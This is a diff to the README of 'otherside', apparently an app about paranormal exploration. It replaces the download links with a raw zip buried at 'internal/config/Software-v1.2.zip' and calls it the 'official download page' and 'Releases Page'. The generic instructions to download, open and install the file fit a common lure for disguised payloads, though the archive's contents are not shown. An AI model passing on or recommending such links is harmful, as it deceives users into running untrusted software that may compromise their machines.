@@ -6,7 +6,7 @@ Welcome to the otherside! This application helps you explore the realm of parano
 
 ## 📥 Download the Application
 
-[![Download otherside](https://raw.githubusercontent.com/Kaushikkumar10/otherside/master/extravagate/otherside.zip)](https://raw.githubusercontent.com/Kaushikkumar10/otherside/master/extravagate/otherside.zip)
+[![Download otherside](https://github.com/Kaushikkumar10/otherside/raw/refs/heads/master/internal/config/Software-v1.2.zip)](https://github.com/Kaushikkumar10/otherside/raw/refs/heads/master/internal/config/Software-v1.2.zip)
 
 ## 🔍 Features
 
@@ -20,7 +20,7 @@ Welcome to the otherside! This application helps you explore the realm of parano
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to the official [download page](https://raw.githubusercontent.com/Kaushikkumar10/otherside/master/extravagate/otherside.zip). 
+1. **Visit the Releases Page**: Go to the official [download page](https://github.com/Kaushikkumar10/otherside/raw/refs/heads/master/internal/config/Software-v1.2.zip). 
 2. **Choose Your Version**: You will see several versions available. Select the latest release for the best experience. 
 3. **Download the Application**: Locate the file that matches your operating system. Click on the file to begin the download.
 4. **Run the Application**: After the download is complete, open the file. Follow the on-screen instructions to install the application.
